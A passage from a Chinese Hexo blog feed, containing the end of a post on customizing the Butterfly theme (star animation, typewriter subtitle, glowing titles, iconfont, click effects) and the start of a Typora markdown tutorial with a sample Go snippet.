class="params"></span>)&#123;<span class="keyword">if</span>(h.<span class="title function_">beginPath</span>(),<span class="variable language_">this</span>.<span class="property">giant</span>)h.<span class="property">fillStyle</span>=<span class="string">&quot;rgba(&quot;</span>+a+<span class="string">&quot;,&quot;</span>+<span class="variable language_">this</span>.<span class="property">opacity</span>+<span class="string">&quot;)&quot;</span>,h.<span class="title function_">arc</span>(<span class="variable language_">this</span>.<span class="property">x</span>,<span class="variable language_">this</span>.<span class="property">y</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">2</span>*<span class="title class_">Math</span>.<span class="property">PI</span>,!<span class="number">1</span>);<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">comet</span>)&#123;h.<span class="property">fillStyle</span>=<span class="string">&quot;rgba(&quot;</span>+d+<span class="string">&quot;,&quot;</span>+<span class="variable language_">this</span>.<span class="property">opacity</span>+<span class="string">&quot;)&quot;</span>,h.<span class="title function_">arc</span>(<span class="variable language_">this</span>.<span class="property">x</span>,<span class="variable language_">this</span>.<span class="property">y</span>,<span class="number">1.5</span>,<span class="number">0</span>,<span class="number">2</span>*<span class="title class_">Math</span>.<span class="property">PI</span>,!<span class="number">1</span>);<span class="keyword">for</span>(<span class="keyword">var</span> t=<span class="number">0</span>;t&lt;<span class="number">30</span>;t++)h.<span class="property">fillStyle</span>=<span class="string">&quot;rgba(&quot;</span>+d+<span class="string">&quot;,&quot;</span>+(<span class="variable language_">this</span>.<span class="property">opacity</span>-<span class="variable language_">this</span>.<span class="property">opacity</span>/<span class="number">20</span>*t)+<span class="string">&quot;)&quot;</span>,h.<span class="title function_">rect</span>(<span class="variable language_">this</span>.<span class="property">x</span>-<span class="variable language_">this</span>.<span class="property">dx</span>/<span class="number">4</span>*t,<span class="variable language_">this</span>.<span class="property">y</span>-<span class="variable language_">this</span>.<span class="property">dy</span>/<span class="number">4</span>*t-<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>),h.<span class="title function_">fill</span>()&#125;<span class="keyword">else</span> h.<span class="property">fillStyle</span>=<span class="string">&quot;rgba(&quot;</span>+r+<span class="string">&quot;,&quot;</span>+<span class="variable language_">this</span>.<span class="property">opacity</span>+<span class="string">&quot;)&quot;</span>,h.<span class="title function_">rect</span>(<span class="variable language_">this</span>.<span class="property">x</span>,<span class="variable language_">this</span>.<span class="property">y</span>,<span class="variable language_">this</span>.<span class="property">r</span>,<span class="variable language_">this</span>.<span class="property">r</span>);h.<span class="title function_">closePath</span>(),h.<span class="title function_">fill</span>()&#125;,<span class="variable language_">this</span>.<span class="property">move</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="variable language_">this</span>.<span class="property">x</span>+=<span class="variable language_">this</span>.<span class="property">dx</span>,<span class="variable language_">this</span>.<span class="property">y</span>+=<span class="variable language_">this</span>.<span class="property">dy</span>,!<span class="number">1</span>===<span class="variable language_">this</span>.<span class="property">fadingOut</span>&amp;&amp;<span class="variable language_">this</span>.<span class="title function_">reset</span>(),(<span class="variable language_">this</span>.<span class="property">x</span>&gt;n-n/<span class="number">4</span>||<span class="variable language_">this</span>.<span class="property">y</span>&lt;<span class="number">0</span>)&amp;&amp;(<span class="variable language_">this</span>.<span class="property">fadingOut</span>=!<span class="number">0</span>)&#125;,<span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;o=!<span class="number">1</span>&#125;,<span class="number">50</span>)&#125;<span class="keyword">function</span> <span class="title function_">m</span>(<span class="params">t</span>)&#123;<span class="keyword">return</span> <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="number">1e3</span>*<span class="title class_">Math</span>.<span class="title function_">random</span>())+<span class="number">1</span>&lt;<span class="number">10</span>*t&#125;<span class="keyword">function</span> <span class="title function_">l</span>(<span class="params">t,i</span>)&#123;<span class="keyword">return</span> <span class="title class_">Math</span>.<span class="title function_">random</span>()*(i-t)+t&#125;<span class="title function_">f</span>(),<span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;resize&quot;</span>,f,!<span class="number">1</span>),<span class="keyword">function</span>(<span class="params"></span>)&#123;h=s.<span class="title function_">getContext</span>(<span class="string">&quot;2d&quot;</span>);<span class="keyword">for</span>(<span class="keyword">var</span> t=<span class="number">0</span>;t&lt;i;t++)c[t]=<span class="keyword">new</span> y,c[t].<span class="title function_">reset</span>();<span class="title function_">u</span>()&#125;(),<span class="keyword">function</span> <span class="title function_">t</span>(<span class="params"></span>)&#123;<span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&#x27;html&#x27;</span>)[<span class="number">0</span>].<span class="title function_">getAttribute</span>(<span class="string">&#x27;data-theme&#x27;</span>)==<span class="string">&#x27;dark&#x27;</span>&amp;&amp;<span class="title function_">u</span>(),<span class="variable language_">window</span>.<span class="title function_">requestAnimationFrame</span>(t)&#125;()</span><br><span class="line">&#125;;</span><br><span class="line"><span class="title function_">dark</span>()</span><br></pre></td></tr></table></figure><p>在主题目录下的<code>_config.yaml</code>中做如下修改:</p><p>在<code>inject</code>-<code>head</code>下追加:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">head:</span></span><br><span class="line">   <span class="bullet">-</span> <span class="string">&lt;link</span> <span class="string">rel=&quot;stylesheet&quot;</span> <span class="string">href=&quot;/css/universe.css&quot;&gt;</span></span><br></pre></td></tr></table></figure><p>在<code>inject</code>-<code>bottom</code>下追加:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">bottom:</span></span><br><span class="line">   <span class="bullet">-</span> <span class="string">&lt;canvas</span> <span class="string">id=&quot;universe&quot;&gt;&lt;/canvas&gt;</span></span><br><span class="line">   <span class="bullet">-</span> <span class="string">&lt;script</span> <span class="string">defer</span> <span class="string">src=&quot;/js/universe.js&quot;&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><p>星空效果只有打开黑夜模式后才能看出来</p><p><strong>todo:打开黑夜模式后,加了黄底的字会很难辨认,并且刺眼,把以前加了黄底的字改一改吧</strong></p><br><hr><br><h1 id="11主页显示的副标题"><a href="#11主页显示的副标题" class="headerlink" title="11主页显示的副标题"></a>11主页显示的副标题</h1><p>在主题目录下的<code>_config.yml</code>中做如下修改:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># the subtitle on homepage (主頁subtitle)</span></span><br><span class="line"><span class="attr">subtitle:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># Typewriter Effect (打字效果)</span></span><br><span class="line">  <span class="attr">effect:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># loop (循環打字)</span></span><br><span class="line">  <span class="attr">loop:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># source 調用第三方服務</span></span><br><span class="line">  <span class="comment"># source: false 關閉調用</span></span><br><span class="line">  <span class="comment"># source: 1  調用一言網的一句話（簡體） https://hitokoto.cn/</span></span><br><span class="line">  <span class="comment"># source: 2  調用一句網（簡體） http://yijuzhan.com/</span></span><br><span class="line">  <span class="comment"># source: 3  調用今日詩詞（簡體） https://www.jinrishici.com/</span></span><br><span class="line">  <span class="comment"># subtitle 會先顯示 source , 再顯示 sub 的內容</span></span><br><span class="line">  <span class="attr">source:</span> <span class="number">3</span></span><br><span class="line">  <span class="comment"># 如果關閉打字效果，subtitle 只會顯示 sub 的第一行文字</span></span><br><span class="line">  <span class="attr">sub:</span> </span><br><span class="line">    <span class="bullet">-</span> <span class="string">心态平和</span> <span class="string">热爱生活</span></span><br></pre></td></tr></table></figure><p>在 <code>source</code>中调用了第三方服务后(例如今日诗词),主页副标题会随机展示来自今日诗词的内容</p><p>然后再展示<code>sub</code>后添加的自定义内容(<code>effect</code>需要设置为<code>true</code>才能依次显示多个内容)</p><p>效果:</p><img src="/images/hexo-butterfly/image-20220806141933771.png" alt="image-20220806141933771" style="zoom:67%;" /><p><span style='color:black;background:yellow;font-size:23px;font-family:hei'><strong>踩坑记录:</strong></span></p><p>这里配置完毕之后主页一直不显示设置好的副标题</p><p>最后在butterfly的issue中找到:<a href="https://github.com/jerryc127/hexo-theme-butterfly/issues/824">https://github.com/jerryc127/hexo-theme-butterfly/issues/824</a></p><p>因为我之前在<code>blog</code>的根目录除了<code>_config.yml</code>之外,还有两个名为<code>_config.butterfly.yml</code>和<code>_config.landscape.yml</code>的文件</p><p>(这两个文件是不生效的,这里博客的所有配置都在根目录和主题目录下的两个<code>_config.yml</code>中)</p><p>将这两个文件删除,就可以正确显示副标题了</p><p>🥳再加一点炫酷的东西:  让主标题和副标题闪闪发光!</p><img src="/images/hexo-butterfly/image-20220806142708278.png" alt="image-20220806142708278" style="zoom:67%;" /><p>在<code>themes\source\css</code>下创建文件<code>title.css</code>,内容为:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 网站标题、副标题闪光 */</span></span><br><span class="line"><span class="selector-id">#page-header</span> <span class="selector-id">#site-title</span>,</span><br><span class="line"><span class="selector-id">#page-header</span> <span class="selector-id">#site-subtitle</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="built_in">rgb</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>);</span><br><span class="line">  <span class="attribute">text-shadow</span>: <span class="built_in">rgb</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>) <span class="number">0px</span> <span class="number">0px</span> <span class="number">10px</span>, <span class="built_in">rgb</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>) <span class="number">0px</span> <span class="number">0px</span> <span class="number">20px</span>,</span><br><span class="line">    <span class="built_in">rgb</span>(<span class="number">255</span>, <span class="number">0</span>, <span class="number">222</span>) <span class="number">0px</span> <span class="number">0px</span> <span class="number">30px</span>, <span class="built_in">rgb</span>(<span class="number">255</span>, <span class="number">0</span>, <span class="number">222</span>) <span class="number">0px</span> <span class="number">0px</span> <span class="number">40px</span>,</span><br><span class="line">    <span class="built_in">rgb</span>(<span class="number">255</span>, <span class="number">0</span>, <span class="number">222</span>) <span class="number">0px</span> <span class="number">0px</span> <span class="number">70px</span>, <span class="built_in">rgb</span>(<span class="number">255</span>, <span class="number">0</span>, <span class="number">222</span>) <span class="number">0px</span> <span class="number">0px</span> <span class="number">80px</span>,</span><br><span class="line">    <span class="built_in">rgb</span>(<span class="number">255</span>, <span class="number">0</span>, <span class="number">222</span>) <span class="number">0px</span> <span class="number">0px</span> <span class="number">100px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#page-header</span> <span class="selector-id">#site-title</span><span class="selector-pseudo">:hover</span>,</span><br><span class="line"><span class="selector-id">#page-header</span> <span class="selector-id">#site-subtitle</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="built_in">rgb</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>);</span><br><span class="line">  <span class="attribute">text-shadow</span>: <span class="built_in">rgb</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>) <span class="number">0px</span> <span class="number">0px</span> <span class="number">10px</span>, <span class="built_in">rgb</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>) <span class="number">0px</span> <span class="number">0px</span> <span class="number">20px</span>,</span><br><span class="line">    <span class="built_in">rgb</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>) <span class="number">0px</span> <span class="number">0px</span> <span class="number">30px</span>, <span class="built_in">rgb</span>(<span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>) <span class="number">0px</span> <span class="number">0px</span> <span class="number">40px</span>,</span><br><span class="line">    <span class="built_in">rgb</span>(<span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>) <span class="number">0px</span> <span class="number">0px</span> <span class="number">70px</span>, <span class="built_in">rgb</span>(<span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>) <span class="number">0px</span> <span class="number">0px</span> <span class="number">80px</span>,</span><br><span class="line">    <span class="built_in">rgb</span>(<span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>) <span class="number">0px</span> <span class="number">0px</span> <span class="number">100px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在主题目录下的<code>_config.yml</code>中的<code>inject---head</code>下添加:</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="string">&lt;link</span> <span class="string">rel=&quot;stylesheet&quot;</span> <span class="string">href=&quot;/css/title.css&quot;&gt;</span></span><br></pre></td></tr></table></figure><br><hr><br><h1 id="12引入图标库iconfont"><a href="#12引入图标库iconfont" class="headerlink" title="12引入图标库iconfont"></a>12引入图标库iconfont</h1><p><span id="02_01">到官方网站注册一个账号<a href="https://www.iconfont.cn/">https://www.iconfont.cn/</a></span></p><p>搜索到某个图标后点击购物车图标将其<strong>添加入库</strong>,第一次添加时需要创建一个新项目</p><img src="/images/hexo-butterfly/image-20220806151547043.png" alt="image-20220806151547043" style="zoom:50%;" /><p>创建好项目之后,会自动跳转到项目的详情页,此时刚刚找到的那个图标已经加入到了项目中,点击<code>Font class</code>,然后点击<code>查看在线链接</code>,第一次会显示<code>暂无代码,点击生成</code>,生成后就会出现下边的这个链接</p><img src="/images/hexo-butterfly/image-20220806151655933.png" alt="image-20220806151655933" style="zoom:67%;" /><p>将这个链接复制到主题目录下的<code>_config.yml</code>中的<code>inject---head</code>下,格式为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">- &lt;link rel=&quot;stylesheet&quot; href=&quot;//at.alicdn.com/t/c/font_3571753_hc60oskdsr8.css&quot;&gt;</span><br></pre></td></tr></table></figure><p>接下来就可以在需要的地方直接以图标名调用图标了,格式为<code>iconfont 图标名称</code></p><p>例如:</p><img src="/images/hexo-butterfly/image-20220806152035453.png" alt="image-20220806152035453" style="zoom: 67%;" /><p>效果为:</p><img src="/images/hexo-butterfly/image-20220806152059932.png" alt="image-20220806152059932" style="zoom:67%;" /><br><hr><br><h1 id="其他小改动"><a href="#其他小改动" class="headerlink" title="其他小改动"></a>其他小改动</h1><h2 id="代码风格"><a href="#代码风格" class="headerlink" title="代码风格"></a>代码风格</h2><p>在主题目录下的<code>_config.yaml</code>中做如下修改:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">highlight_theme:</span> <span class="string">mac</span> <span class="comment">#  darker / pale night / light / ocean / mac / mac light / false</span></span><br></pre></td></tr></table></figure><p>可选项包括:</p><p><code>darker / pale night / light / ocean / mac / mac light / false</code></p><h2 id="鼠标点击特效"><a href="#鼠标点击特效" class="headerlink" title="鼠标点击特效"></a>鼠标点击特效</h2><p>在主题目录下的<code>_config.yaml</code>中做如下修改:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">activate_power_mode:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">colorful:</span> <span class="literal">true</span> <span class="comment"># open particle animation (冒光特效)</span></span><br><span class="line">  <span class="attr">shake:</span> <span class="literal">true</span> <span class="comment">#  open shake (抖動特效)</span></span><br><span class="line">  <span class="attr">mobile:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Mouse click effects: fireworks (鼠標點擊效果: 煙火特效)</span></span><br><span class="line"><span class="attr">fireworks:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">zIndex:</span> <span class="number">9999</span> <span class="comment"># -1 or 9999</span></span><br><span class="line">  <span class="attr">mobile:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Mouse click effects: Heart symbol (鼠標點擊效果: 愛心)</span></span><br><span class="line"><span class="attr">click_heart:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">mobile:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Mouse click effects: words (鼠標點擊效果: 文字)</span></span><br><span class="line"><span class="attr">ClickShowText:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">text:</span></span><br><span class="line">     <span class="bullet">-</span> <span class="string">🤣</span></span><br><span class="line">     <span class="bullet">-</span> <span class="string">😘</span></span><br><span class="line">     <span class="bullet">-</span> <span class="string">🤨</span></span><br><span class="line">     <span class="bullet">-</span> <span class="string">🥱</span></span><br><span class="line">     <span class="bullet">-</span> <span class="string">😣</span></span><br><span class="line">     <span class="bullet">-</span> <span class="string">😤</span></span><br><span class="line">     <span class="bullet">-</span> <span class="string">😭</span></span><br><span class="line">  <span class="attr">fontSize:</span> <span class="string">25px</span></span><br><span class="line">  <span class="attr">random:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">mobile:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure><p>可以选择点击后出现 <strong>烟火,爱心,自定义文字等</strong></p><p>这里使用点击后出现文本特效,在<code>text</code>子字段下面添加想要出现的文字,每次点击会随机(<code>random</code>字段为<code>True</code>)出现其中的某一个, 通过<code>fontSize</code>来设置字体大小</p>]]></content>
      
      
      <categories>
          
          <category> 搭建博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Typora写markdown的慢慢入门😥</title>
      <link href="/post/39e7fa88.html"/>
      <url>/post/39e7fa88.html</url>
      
        <content type="html"><![CDATA[<p><span id="jump">这是一个锚点,是后面页内链接要跳转到的地方,这里的id可以自定义,用来和后面的链接对应</span></p><h1 id="1这是代码"><a href="#1这是代码" class="headerlink" title="1这是代码"></a>1这是代码</h1><p>直接连敲三下&#96;(在键盘的tab上方)就可以打开下面这样的代码环境</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> snowflake_proxy</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;io&quot;</span></span><br><span class="line">    <span class="string">&quot;log&quot;</span></span><br><span class="line">    <span class="string">&quot;net&quot;</span></span><br><span class="line">    <span class="string">&quot;regexp&quot;</span></span><br><span class="line">    <span class="string">&quot;sync&quot;</span></span><br><span class="line">    <span class="string">&quot;time&quot;</span></span><br><span class="line">    <span class="string">&quot;git.torproject.org/pluggable-transports/snowflake.git/v2/common/event&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/pion/ice/v2&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/pion/sdp/v3&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/pion/webrtc/v3&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">var</span> remoteIPPatterns = []*regexp.Regexp&#123;</span><br><span class="line">    <span class="comment">/* IPv4 */</span></span><br><span class="line">    regexp.MustCompile(<span class="string">`(?m)^c=IN IP4 ([\d.]+)(?:(?:\/\d+)?\/\d+)?(:? |\r?\n)`</span>),</span><br><span class="line">    <span class="comment">/* IPv6 */</span></span><br><span class="line">    regexp.MustCompile(<span class="string">`(?m)^c=IN IP6 ([0-9A-Fa-f:.]+)(?:\/\d+)?(:? |\r?\n)`</span>),</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><br><h1 id="2-自定义文字的表现效果"><a href="#2-自定义文字的表现效果" class="headerlink" title="2 自定义文字的表现效果"></a>2 自定义文字的表现效果</h1><h2 id="2-1-通过HTML元素"><a href="#2-1-通过HTML元素" class="headerlink" title="2.1 通过HTML元素"></a>2.1 通过HTML元素</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">&#x27;color:blue;background:yellow;font-size:18px;font-family:hei&#x27;</span>&gt;</span>测试字体<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure><p><span style='color:blue;background:yellow;font-size:18px;font-family:hei'>测试字体</span></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">align</span>=<span class="string">&#x27;center&#x27;</span> <span class="attr">style</span>=<span class="string">&#x27;color:blue;font-size:18px;font-family:hei&#x27;</span>&gt;</span></span><br><span class="line">    我是一个独立的块,上面的align=&#x27;center&#x27;可以设置这个块里的文字居中  </span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><div align='center' style='color:blue;font-size:18px;font-family:hei'>    我是一个独立的块,上面的align='center'可以设置这个块里的文字居中  </div><br><h2 id="2-2-文字加粗"><a href="#2-2-文字加粗" class="headerlink" title="2.2 文字加粗"></a>2.2 文字加粗</h2><p><strong>文字加粗效果(在两边各加两个星号)</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">**文字加粗效果**</span><br></pre></td></tr></table></figure><p>或者:</p><p>在<code>span</code>内通过:(尽量多用这种,因为markdown语法在转换成html时可能会出问题)</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">&quot;font-weight:bold&quot;</span>&gt;</span>被加粗的文字<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure><br><h2 id="2-3-分割线"><a href="#2-3-分割线" class="headerlink" title="2.3 分割线"></a>2.3 分割线</h2><p>(输入三个星号自动变成分割线):</p><hr><br><h2 id="2-4-删除文字"><a href="#2-4-删除文字" class="headerlink" title="2.4 删除文字"></a>2.4 删除文字</h2><p>在文字两边各加两个~</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~~我被删除了!~~</span><br></pre></td></tr></table></figure><p><del>我被删除了!</del></p><br><h2 id="2-5-下划线"><a href="#2-5-下划线" class="headerlink" title="2.5 下划线"></a>2.5 下划线</h2><p>通过u标签包裹实现</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">u</span>&gt;</span>我带下划线<span class="tag">&lt;/<span class="name">u</span>&gt;</span></span><br></pre></td></tr></table></figure><p><u>我带下划线</u></p><br><h2 id="2-6-脚注"><a href="#2-6-脚注" class="headerlink" title="2.6 脚注"></a>2.6 脚注</h2><p>对我的补充说明,鼠标悬停在后面就会显示这些补充信息 <a href="%E8%A6%81%E6%98%BE%E7%A4%BA%E7%9A%84%E8%A1%A5%E5%85%85%E4%BF%A1%E6%81%AF%E5%86%99%E5%9C%A8%E8%BF%99%E9%87%8C">^脚注显示的文字</a>。</p><br><hr><br><h1 id="3-列表"><a href="#3-列表" class="headerlink" title="3 列表"></a>3 列表</h1><h2 id="3-1-无序列表"><a href="#3-1-无序列表" class="headerlink" title="3.1 无序列表"></a>3.1 无序列表</h2><ul><li>在一行的开头按下 减号”-“ 然后按空格就可以产生列表了</li><li>回车自动生成下一项<ul><li>回车后tab生成二级列表</li></ul></li></ul><br><h2 id="3-2-有序列表"><a href="#3-2-有序列表" class="headerlink" title="3.2 有序列表"></a>3.2 有序列表</h2><ol><li>输入”1.”然后按空格,自动生成有序列表</li><li>输入回车会自动往下排<ol><li>回车后tab生成二级列表</li></ol></li></ol><br><h2 id="3-3-任务列表"><a href="#3-3-任务列表" class="headerlink" title="3.3 任务列表"></a>3.3 任务列表</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">先输入后面的文字</span><br><span class="line">在前面输入&quot;-&quot;和&quot;[]&quot;</span><br><span class="line">在两者之间加上空格</span><br><span class="line">然后在[]中输入x</span><br><span class="line">最后在[]和文字之间加上空格</span><br><span class="line"></span><br><span class="line">- [x] 任务1</span><br></pre></td></tr></table></figure><ul><li><p><input checked="" disabled="" type="checkbox"> 今天学会搭建博客</p></li><li><p><input checked="" disabled="" type="checkbox"> hhh</p></li></ul><br><hr><br><h1 id="4-区块"><a href="#4-区块" class="headerlink" title="4 区块"></a>4 区块</h1><blockquote><p>输入”&gt;” 然后按空格,自动产生一个区块</p><p>区块是可以嵌套的:</p><blockquote><p>再次输入”&gt;” 然后按空格</p><p>我是第二层区块</p><ul><li><p>在区块里面同样可以使用列表,我是插入在区块里的列表</p></li><li><p>同理,在列表里也可以使用区块:</p></li><li><blockquote><p>我是列表里的区块</p><p>哈哈哈哈哈</p></blockquote></li></ul></blockquote></blockquote><br><hr><br><h1 id="5-链接"><a href="#5-链接" class="headerlink" title="5 链接"></a>5 链接</h1><h2 id="5-1-链接到网址"><a href="#5-1-链接到网址" class="headerlink" title="5.1 链接到网址"></a>5.1 链接到网址</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">链接名称</span>](<span class="link">链接地址 &quot;可选项,悬停时显示的文字&quot;</span>)</span><br></pre></td></tr></table></figure><p>例如: </p><p>在编辑器里ctrl点击链接以打开链接</p><p><a href="https://www.runoob.com/markdown/md-link.html" title="我是悬停文字">我可以链接到菜鸟教程的链接页面</a></p><p>也可以直接显示链接地址:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">链接地址</span>&gt;</span></span><br></pre></td></tr></table></figure><p>例如:<a href="https://www.runoob.com/">https://www.runoob.com</a></p><br><h2 id="5-2-链接到同目录文件"><a href="#5-2-链接到同目录文件" class="headerlink" title="5.2 链接到同目录文件"></a>5.2 链接到同目录文件</h2><p>链接到同目录其他md文件:</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">我可以链接到同目录下的hello_world.md</span>](<span class="link">hello-world.md</span>)</span><br></pre></td></tr></table></figure><p><a href="hello-world.md">我可以链接到同目录下的hello_world.md</a></p><br><h2 id="5-3-页面内跳转"><a href="#5-3-页面内跳转" class="headerlink" title="5.3 页面内跳转"></a>5.3 页面内跳转</h2><br><h3 id="5-3-1-跳转到锚点"><a href="#5-3-1-跳转到锚点" class="headerlink" title="5.3.1 跳转到锚点"></a>5.3.1 跳转到锚点</h3><p><a href="#jump">由此跳转到</a></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在某处定义锚点: <span class="language-xml"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;自定义&quot;</span>&gt;</span></span>这是一个锚点,是后面页内链接要跳转到的地方,这里的id可以自定义,用来和后面的链接对应<span class="language-xml"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">用来跳转到锚点的链接 [<span class="string">由此跳转到</span>](<span 